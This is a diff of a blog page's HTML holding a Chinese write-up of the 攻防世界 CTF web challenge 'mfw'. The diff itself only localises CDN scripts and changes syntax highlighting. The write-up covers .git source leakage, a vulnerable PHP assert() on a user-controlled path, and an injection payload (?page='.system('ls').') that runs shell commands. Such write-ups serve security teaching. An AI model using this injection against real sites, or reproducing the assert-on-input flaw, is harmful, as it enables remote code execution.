@@ -14,7 +14,7 @@
 
 
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
   <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
   <script src="/lib/pace/pace.min.js"></script>
 
@@ -279,7 +279,7 @@
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题来源于攻防世界<code>WEB</code>题，题目名称为<code>mfw</code>，考察的是<code>PHP</code>代码注入，需要有点脑洞，故记录一下。</p>
 <a id="more"></a>
 <h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先打开网站后浏览页面，可看到提示用到<code>Git</code>、<code>PHP</code>、<code>Bootstrap</code>，自然想到<code>.git</code>源码泄露：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-23-39.png"><br>查看一下果然存在：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-26-12.png"><br>那么使用<code>GitHack</code>工具下载源码<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-27-33.png"><br>下载后所有代码如下：<br><img data-src="/2020/11/16/mfw-writeup/2020-11-16-01-30-02.png"><br>很明显flag在<code>flag.php</code>文件中，但是泄露的源码中未写入，所以需要根据<code>index.php</code>的漏洞读取到<code>flag.php</code>文件，因为其它的三个都是静态文件。<br>因为代码中有<code>assert</code>执行判断，而<code>$file</code>可控，所以可以调整<code>$file</code>值进行代码注入，源代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>构造exp如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=<span class="string">&#x27;.system(&#x27;</span>ls<span class="string">&#x27;).&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>完整的php语句为：</p>
@@ -508,10 +508,10 @@
   
   <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
   <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.fancybox.min.js"></script>
+  <script src="/js/lozad.min.js"></script>
+  <script src="/js/pangu.min.js"></script>
   <script src="/lib/velocity/velocity.min.js"></script>
   <script src="/lib/velocity/velocity.ui.min.js"></script>
 
